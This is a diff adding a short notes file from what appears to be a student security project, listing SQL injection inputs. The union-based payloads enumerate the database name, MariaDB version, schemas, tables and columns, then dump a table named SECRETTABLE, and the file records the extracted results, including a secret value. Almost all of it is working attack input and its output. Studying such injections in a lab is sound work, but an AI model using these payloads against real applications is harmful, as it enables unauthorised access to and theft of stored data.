@@ -1,0 +1,23 @@
+Other testing inputs:
+-1' UNION SELECT 1# 
+-1' UNION SELECT 1,2# 
+-1' UNION SELECT 1,2,3# 
+-1' UNION SELECT 1,2,GROUP_CONCAT(schema_name) FROM information_schema.schemata#
+-1' UNION SELECT 1,2,GROUP_CONCAT(table_name) FROM information_schema.tables WHERE TABLE_TYPE = 'BASE TABLE' AND table_schema='proj2_xtra_cr3dit'#
+-1' UNION SELECT 1,2,GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='inject3_users'#
+-1' UNION SELECT 1,2,GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='foo'#
+-1' UNION SELECT 1,2,GROUP_CONCAT(message) FROM foo#
+-1' UNION SELECT 1,GROUP_CONCAT(first_name),GROUP_CONCAT(last_name) FROM inject3_users#
+
+
+Actual injection inputs:
+-1‘ union select 1,2,database() # 
+-1' union select 1,2,@@version # 
+-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema = 'proj2_xtra_cr3dit' #
+-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='SECRETTABLE' #
+-1' union select 1,2,group_concat(secret) from SECRETTABLE #
+
+Name: proj2_xtra_cr3dit
+Version: 10.5.12-MariaDB-0+deb11u1
+Tables: SECRETTABLE,inject3_users,foo
+Secret: hunter2
